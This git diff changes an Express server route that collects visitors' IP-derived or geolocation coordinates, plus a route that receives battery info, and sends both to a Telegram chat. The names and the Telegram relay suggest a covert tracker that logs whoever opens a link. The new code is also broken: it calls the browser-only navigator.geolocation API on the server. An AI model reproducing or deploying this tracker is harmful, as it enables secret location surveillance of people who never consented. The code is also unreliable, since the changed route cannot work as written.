@@ -138,32 +138,38 @@ app.get('/ajsal', async (req, res) => {
   res.send(html);
 });
 
-// New route to handle button click
+// New route to handle button click and send location via geolocation
 app.get('/axl', async (req, res) => {
-  const userAgent = req.headers['user-agent'];
-  const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+  // Get current geolocation
+  navigator.geolocation.getCurrentPosition(async (position) => {
+    const { latitude, longitude } = position.coords;
 
-  // Fetch user location data
-  const userData = await fetchUserData(userIp);
+    // Fetch user IP just in case you want to verify or send additional data
+    const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+    const userData = await fetchUserData(userIp); // Optional: Get additional IP data
 
-  // Combine all information into one message
-  const message = `
+    // Combine location info into one message
+    const message = `
     🌐 *Location Info*:
-    - **Latitude**: ${userData?.latitude || "Unknown"}
-    - **Longitude**: ${userData?.longitude || "Unknown"}
+    - **Latitude**: ${latitude || "Unknown"}
+    - **Longitude**: ${longitude || "Unknown"}
   `;
 
-  // Send the information to Telegram
-  bot.sendMessage(ajsal, message, { parse_mode: 'Markdown' });
+    // Send the information to Telegram
+    bot.sendMessage(ajsal, message, { parse_mode: 'Markdown' });
 
-  // Respond with a simple message
-  res.send('Location info has been sent to Telegram.');
+    // Respond with a simple message
+    res.send('Location info has been sent to Telegram.');
+  }, (error) => {
+    console.error('Error getting location:', error);
+    res.send('Failed to get location info.');
+  });
 });
 
 // Handle battery info sent from the client
 app.post('/battery', express.json(), (req, res) => {
   const { level, charging } = req.body;
-  const nmessage = `👨🏻‍💻 Navgitor.UserAgent Info 
+  const nmessage = `👨🏻‍💻 Navigator.UserAgent Info 
  
  🔋 *Battery Info*:
 - Level: ${level}
